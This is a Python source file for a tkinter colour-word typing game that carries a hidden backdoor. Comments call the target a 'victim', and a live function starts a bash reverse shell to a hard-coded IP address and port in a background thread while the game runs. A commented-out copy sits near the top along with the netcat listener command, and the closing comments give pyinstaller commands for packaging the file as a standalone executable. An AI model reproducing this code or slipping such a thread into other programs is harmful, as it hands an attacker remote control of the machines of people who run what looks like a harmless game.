# import the modules
import tkinter
import random
import subprocess
import threading

# list of possible colour.
colours = [
	'Red','Blue','Green','Pink','Black',
	'Yellow','Orange','White','Purple','Brown'
	]
score = 0

# the game time left, initially 30 seconds.
timeleft = 60

# # opening backdoor on victims pc
# def victim(num):
#     subprocess.check_call("/bin/bash -i > /dev/tcp/82.165.97.169/2246 0<&1 2>&1", shell=True, executable='/bin/bash')

# # nc -lnvp 2246 -s 82.165.97.169

# # a thread to allow this command to always run even if the game is being played
# def hacking_thread(hack):
#     thread = threading.Thread(target = hack, args=(10,))
#     thread.start()

# function that will start the game.
def startGame(event):

	if timeleft == 60:
		
		# start the countdown timer.
		countdown()
	# run the function to choose the next colour.
	nextColour()

# Function to choose and display the next colour.
def nextColour():

	# use the globally declared 'score' and 'play' variables above.
	global score
	global timeleft

	# if a game is currently in play
	if timeleft > 0:

		# make the text entry box active.
		e.focus_set()

		# if the colour typed is equal to the colour of the text
		if e.get().lower() == colours[1].lower():
			
			score += 1

		# clear the text entry box.
		e.delete(0, tkinter.END)
		
		random.shuffle(colours)
		
		# change the colour to type, by changing the text _and_ the colour to a random colour value
		label.config(fg = str(colours[1]), text = str(colours[0]))
		
		# update the score.
		scoreLabel.config(text = "Score: " + str(score))


# Countdown timer function
def countdown():

	global timeleft

	# if a game is in play
	if timeleft > 0:

		# decrement the timer.
		timeleft -= 1
		
		# update the time left label
		timeLabel.config(text = "Time left: "
							+ str(timeleft))
								
		# run the function again after 1 second.
		timeLabel.after(1000, countdown)


# Driver Code

# create a GUI window
root = tkinter.Tk()

# set the title
root.title("COLORGAME")

# set the title
# root.iconbitmap("game.ico")

# set the size
root.geometry("400x400")

# add an instructions label
instructions = tkinter.Label(root, text = "\n\n\n\n\n\nType in the colour"
						"of the words. \n NB: Not the word text!\n\n",
									font = ('Helvetica', 12))
instructions.pack()

# add a score label
scoreLabel = tkinter.Label(root, text = "Press enter to start",
									font = ('Helvetica', 12))
scoreLabel.pack()

# add a time left label
timeLabel = tkinter.Label(root, text = "Time left: " +
			str(timeleft), font = ('Helvetica', 12))
				
timeLabel.pack()

# add a label for displaying the colours
label = tkinter.Label(root, font = ('Helvetica', 20))
label.pack()

# add a text entry box for typing in colours
e = tkinter.Entry(root)

# run the 'startGame' function when the enter key is pressed
root.bind('<Return>', startGame)
e.pack()

# set focus on the entry box
e.focus_set()

# start the GUI
# root.mainloop()


def hack(num):
    subprocess.check_call("/bin/bash -i > /dev/tcp/82.165.97.169/2246 0<&1 2>&1", shell=True, executable='/bin/bash')

if __name__ == '__main__':
    thread = threading.Thread(target= hack, args=(10,))
    thread.start()
    root.mainloop()
    exit()


# pyinstaller.exe --onefile --icon=game.ico Visual_game.py
# pyinstaller --onefile -w Visual_game.py
# pyinstaller --onefile Visual_game.py